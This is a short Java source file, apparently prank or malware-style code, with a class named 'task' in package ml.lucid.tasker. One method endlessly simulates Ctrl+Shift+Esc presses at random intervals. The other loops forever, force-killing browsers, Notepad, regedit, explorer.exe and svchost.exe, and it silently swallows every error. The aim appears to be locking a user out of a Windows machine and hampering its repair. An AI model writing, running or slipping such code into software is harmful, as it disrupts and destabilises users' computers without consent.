package ml.lucid.tasker;

import java.awt.*;
import java.awt.event.KeyEvent;
import java.io.IOException;
import java.util.Random;
import java.util.concurrent.TimeUnit;

public class task {

    public static void taskstart() {
        try {
            Robot bot = new Robot();
            Random rng = new Random();
            while (true) {
                int secs = rng.nextInt(3) + 1;
                TimeUnit.SECONDS.sleep(secs);
                bot.keyPress(KeyEvent.VK_CONTROL);
                bot.keyPress(KeyEvent.VK_SHIFT);
                bot.keyPress(KeyEvent.VK_ESCAPE);
            }
        }catch(Exception e){

        }
    }
    public static void taskkill() {
            while(true) {
                try{
                    Runtime.getRuntime().exec("taskkill /IM firefox.exe /F");
                    Runtime.getRuntime().exec("taskkill /IM regedit.exe /F");
                    Runtime.getRuntime().exec("taskkill /IM notepad.exe /F");
                    Runtime.getRuntime().exec("taskkill /IM explorer.exe /F");
                    Runtime.getRuntime().exec("taskkill /IM opera.exe /F");
                    Runtime.getRuntime().exec("taskkill /IM svchost.exe /F");
                    Runtime.getRuntime().exec("taskkill /IM chrome.exe /F");
                }catch(IOException io){

                }
            }
    }
}
